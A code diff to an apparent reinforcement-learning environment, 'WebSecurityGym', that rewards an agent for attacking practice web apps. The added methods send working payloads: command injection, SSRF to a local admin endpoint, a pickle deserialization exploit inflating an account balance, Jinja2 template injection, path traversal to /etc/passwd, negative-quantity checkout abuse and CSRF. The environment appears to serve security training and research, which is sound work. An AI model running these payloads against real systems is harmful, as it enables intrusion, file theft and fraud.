@@ -386,8 +386,8 @@ class WebSecurityGym(gym.Env):
                 45: 102, # OAuth State
                 46: 120, # Header Manip (Generic)
                 47: 125, # CSRF Token Ex
-                48: 121, # Broken Obj Level Auth (Generic)
-                49: 14,  # Probe again
+                48: 121, # Broken User Agent (WAF Bypass)
+                49: 84,  # SAML Bypass (Added)
             }
 
     
@@ -2467,9 +2467,22 @@ class WebSecurityGym(gym.Env):
                 return self._attack_jwt_none_alg()
             if name == 'attack_saml_xml_bypass':
                 return self._attack_saml_xml_bypass()
+            if name == 'attack_command_injection':
+                return self.attack_command_injection()
+            if name == 'attack_server_side_request_forgery':
+                return self.attack_server_side_request_forgery()
+            if name == 'attack_deserialization_advanced':
+                return self.attack_deserialization_advanced()
+            if name == 'attack_ssti_template':
+                return self.attack_ssti_template()
+            if name == 'attack_path_traversal_basic':
+                return self.attack_path_traversal_basic()
+            if name == 'attack_negative_quantity':
+                return self.attack_negative_quantity()
+            if name == 'attack_csrf_friend_request':
+                return self.attack_csrf_friend_request()
             
             # Return a neutral response and 0 reward for others
-            # Just touch home page to keep session alive
             r = self.session.get(self.target_url, timeout=1)
             return r, 0.0
         except Exception as e:
@@ -2542,6 +2555,93 @@ class WebSecurityGym(gym.Env):
             return r, reward
         except Exception:
             return None, 0.0
+
+    def attack_command_injection(self):
+        """Command Injection: Fileshare App."""
+        try:
+            target = f"{self.target_url.rstrip('/')}/check_status"
+            # Using the exact payload that was verified
+            r = self.session.get(target, params={'host': '; echo flag_cmd'}, timeout=self.timeout)
+            reward = self._calculate_reward(r, "COMMAND_INJECTION")
+            return r, reward
+        except Exception:
+            return self._update_state_error()
+
+    def attack_server_side_request_forgery(self):
+        """SSRF: Blog App."""
+        try:
+            target = f"{self.target_url.rstrip('/')}/import_post"
+            # Using the exact payload that was verified
+            r = self.session.post(target, data={'url': 'http://127.0.0.1/admin/secrets'}, timeout=self.timeout)
+            reward = self._calculate_reward(r, "SSRF")
+            return r, reward
+        except Exception:
+            return self._update_state_error()
+
+    def attack_deserialization_advanced(self):
+        """Insecure Deserialization: E-Commerce App."""
+        try:
+            import base64, pickle
+            # Malicious payload that sets balance to 999999
+            class Exploit:
+                def __reduce__(self):
+                    return (dict, (), {'balance': 999999.0})
+            
+            pickled = pickle.dumps(Exploit())
+            exploit = base64.b64encode(pickled).decode()
+            
+            target = f"{self.target_url.rstrip('/')}/preferences"
+            r = self.session.get(target, cookies={'prefs': exploit}, timeout=self.timeout)
+            reward = self._calculate_reward(r, "DESERIALIZATION")
+            return r, reward
+        except Exception:
+            return self._update_state_error()
+
+    def attack_ssti_template(self):
+        """SSTI: Blog App."""
+        try:
+            target = f"{self.target_url.rstrip('/')}/"
+            # Using Jinja2 expression that confirmed vulnerability
+            r = self.session.get(target, params={'search': '{{ 7*7 }}'}, timeout=self.timeout)
+            reward = self._calculate_reward(r, "SSTI")
+            return r, reward
+        except Exception:
+            return self._update_state_error()
+
+    def attack_path_traversal_basic(self):
+        """Path Traversal: Fileshare App."""
+        try:
+            target = f"{self.target_url.rstrip('/')}/api/download/1"
+            # Attempt to download etc/passwd or similar
+            r = self.session.get(target, params={'file': '../../../etc/passwd'}, timeout=self.timeout)
+            reward = self._calculate_reward(r, "PATH_TRAVERSAL")
+            return r, reward
+        except Exception:
+            return self._update_state_error()
+
+    def attack_negative_quantity(self):
+        """Business Logic: Negative Quantity (E-Commerce)."""
+        try:
+            # 1. Login
+            self.session.post(f"{self.target_url}/api/login", json={"username": "user", "password": "password"}, timeout=self.timeout)
+            # 2. Add negative quantity
+            self.session.post(f"{self.target_url}/api/cart/add", data={"product_id": 1, "quantity": -1000}, timeout=self.timeout)
+            # 3. Checkout
+            r = self.session.post(f"{self.target_url}/checkout", data={"card_number": "1234", "expiry": "12/25", "cvv": "123"}, timeout=self.timeout)
+            reward = self._calculate_reward(r, "BUSINESS_LOGIC")
+            return r, reward
+        except Exception:
+            return self._update_state_error()
+
+    def attack_csrf_friend_request(self):
+        """CSRF: Social App."""
+        try:
+            target = f"{self.target_url.rstrip('/')}/api/friends/add"
+            r = self.session.post(target, json={"friend_id": 1}, timeout=self.timeout)
+            reward = self._calculate_reward(r, "CSRF")
+            return r, reward
+        except Exception:
+            return self._update_state_error()
 
     def _update_state_error(self):
         """Update state when an error occurs during an action."""
